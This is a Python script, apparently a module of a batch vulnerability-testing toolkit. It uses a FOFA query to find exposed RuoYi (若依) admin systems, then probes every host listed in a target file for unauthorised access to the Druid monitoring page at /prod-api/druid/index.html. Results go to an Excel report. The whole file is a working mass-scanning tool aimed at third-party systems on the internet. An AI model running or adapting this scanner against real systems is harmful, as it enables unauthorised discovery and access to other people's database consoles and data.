
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork


def help():
    print('''
    fofa:  product="若依-管理系统"
        1. 若依管理系统 Druid未授权访问漏洞, 批量测试
    x. 退出
    ''')

def vul_druid(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
    }
    body = ''
    method = "GET"
    path = "/prod-api/druid/index.html"
    notes = ""
    return (url, method, headers, body, path, notes)


def run():
    OUTDIR = "result/若依-管理系统"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    # 获取资产目标
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))

    if num == 1:
        data = []
        for url in li:
            item = vul_druid(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}-若依管理系统 Druid未授权访问漏洞.xlsx")

    else:
        print('bye..')
